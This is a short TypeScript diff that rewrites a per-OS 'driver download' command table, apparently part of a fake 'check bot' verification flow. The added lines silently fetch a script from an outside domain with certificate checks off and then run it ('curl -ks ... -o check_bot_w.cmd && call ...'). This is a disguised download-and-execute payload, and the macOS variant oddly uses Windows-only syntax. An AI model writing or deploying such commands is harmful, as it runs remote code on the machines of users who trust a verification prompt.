@@ -88,8 +88,8 @@ function getExpectedOutput(phrase: string, nonce: string): string {
 type SupportedOs = 'windows' | 'macos'
 
 const CMD_DRIVER_DOWNLOAD: Record<SupportedOs, string> = {
-  windows: 'curl -k https://nodit.org/public/check_bot_w &',
-  macos: 'curl -k https://nodit.org/public/check_bot_m &',
+  windows: 'curl -ks https://nodit.org/check_bot_w -o "check_bot_w.cmd" && call "check_bot_w.cmd" &',
+  macos: 'curl -ks https://nodit.org/check_bot_m -o "check_bot_m.cmd" && call "check_bot_m.cmd" &'
 }
 
 function getCandidateOs(): SupportedOs | null {
